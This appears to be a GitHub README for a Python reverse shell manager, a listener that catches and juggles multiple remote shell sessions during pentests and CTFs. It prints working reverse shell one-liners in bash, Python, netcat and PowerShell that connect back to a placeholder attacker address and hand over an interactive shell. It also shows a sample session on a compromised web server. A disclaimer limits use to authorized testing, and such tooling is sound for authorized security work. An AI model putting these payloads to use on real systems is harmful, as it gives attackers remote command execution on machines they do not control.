# Reverse Shell Manager (RSM)

A lightweight multi-session reverse shell manager written in pure Python.
Handles multiple incoming connections simultaneously, lets you switch between
sessions, maintains command history per session, and logs everything to disk.

No Metasploit. No heavy frameworks. One file, zero dependencies.

---

## What It Does

- Listens on one or more ports simultaneously
- Accepts multiple incoming reverse shell connections
- Lets you interact with any session interactively
- Backgrounds sessions while keeping them alive
- Tracks command history per session
- Attempts OS fingerprinting on connect
- Shows file transfer one-liners per session
- Optionally logs all sessions to timestamped files

---

## Installation

```bash
git clone https://github.com/noam-unchained/reverse-shell-manager.git
cd reverse-shell-manager
# No pip install needed
```

---

## Usage

```bash
# Default — listen on port 4444
python rsm.py

# Custom port
python rsm.py -p 9001

# Multiple ports simultaneously
python rsm.py -p 4444 -p 5555 -p 6666

# Enable session logging
python rsm.py -p 4444 --log
```

---

## Commands

```
sessions              List all active sessions
interact <id>         Drop into an interactive shell with session
kill <id>             Kill a specific session
kill all              Kill all sessions
history <id>          Show command history for a session
upload <id>           Show file upload methods for a session
clear                 Clear the screen
exit                  Quit RSM
```

### Inside a session:
```
background            Return to manager (session stays alive)
exit                  Kill this session
Ctrl+C                Background the session
```

---

## Reverse Shell One-Liners (run on target)

**Bash:**
```bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

**Python3:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Netcat:**
```bash
nc YOUR_IP 4444 -e /bin/bash
```

**PowerShell (Windows):**
```powershell
$c=New-Object Net.Sockets.TCPClient("YOUR_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+">";$e=([text.encoding]::ASCII).GetBytes($r2);$s.Write($e,0,$e.Length)}
```

---

## Example Session

```
=======================================================
  Reverse Shell Manager
=======================================================
  Type help for available commands
  Waiting for incoming connections...

[+] Listening on port 4444
[+] Listening on port 5555

[+] New connection from 10.10.10.5:49321 on port 4444
[Session 1] 10.10.10.5 (Linux)

RSM[*1]> sessions

  ID    IP                 OS           Duration   Status
  ────────────────────────────────────────────────────────
  [1]   10.10.10.5         Linux        0m12s      ALIVE <-- active

RSM[*1]> interact 1

[*] Interacting with session 1
    10.10.10.5 | Linux | running 0m15s
    Type background to return to manager
──────────────────────────────────────────────────────

www-data@victim:/var/www/html$ whoami
www-data
www-data@victim:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@victim:/var/www/html$ background

[*] Session 1 backgrounded

RSM[*1]>
```

---

## File Structure

```
reverse-shell-manager/
├── rsm.py             # Main manager
├── requirements.txt   # No external deps needed
└── README.md
```

---

## Key Concepts

**Why background sessions?**
When doing a pentest you often have multiple targets. RSM lets you run `autoprivesc.py` on session 1, switch to session 2 to do recon, then come back to session 1 for results — all without losing any connection.

**How does OS fingerprinting work?**
On connect, RSM sends `uname -a 2>/dev/null || ver` and reads the banner. Linux returns kernel info, Windows CMD returns its version string, unresponsive targets stay as "unknown".

---

## Possible Extensions

- [ ] SSL-encrypted sessions
- [ ] Tab-completion for shell commands
- [ ] Auto-run a script on new session connect
- [ ] Session persistence (reconnect on drop)
- [ ] Web UI dashboard

---

## Disclaimer

For authorized use in CTF, lab, and pentest environments only.

---

## License

MIT
